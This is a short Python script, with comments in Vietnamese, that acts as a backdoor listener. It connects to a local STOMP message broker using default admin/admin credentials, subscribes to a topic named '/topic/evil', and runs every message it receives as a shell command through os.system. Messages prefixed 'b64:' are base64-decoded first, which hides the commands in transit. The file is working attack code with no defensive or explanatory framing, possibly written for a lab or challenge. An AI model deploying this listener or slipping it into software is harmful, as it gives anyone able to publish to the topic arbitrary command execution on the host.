# WebServer Listener
import stomp
import os
import base64
import time

class EvilListener(stomp.ConnectionListener):
    def on_message(self, frame):
        msg = frame.body
        print(f"[+] Received message: {msg}")
        if msg.startswith("b64:"):
            try:
                cmd = base64.b64decode(msg[4:]).decode()
                print(f"[+] Decoded command: {cmd}")
                os.system(cmd)
            except Exception as e:
                print(f"[-] Decode error: {e}")
        else:
            os.system(msg)

# Tạo kết nối STOMP
conn = stomp.Connection([('localhost', 61613)])
conn.set_listener('', EvilListener())

try:
    conn.connect('admin', 'admin', wait=True)
    conn.subscribe(destination='/topic/evil', id=1, ack='auto')
    print("[*] Listening on /topic/evil...")
except Exception as e:
    print(f"[-] Connection error: {e}")
    exit(1)

# Giữ kết nối hoạt động
while True:
    time.sleep(1)
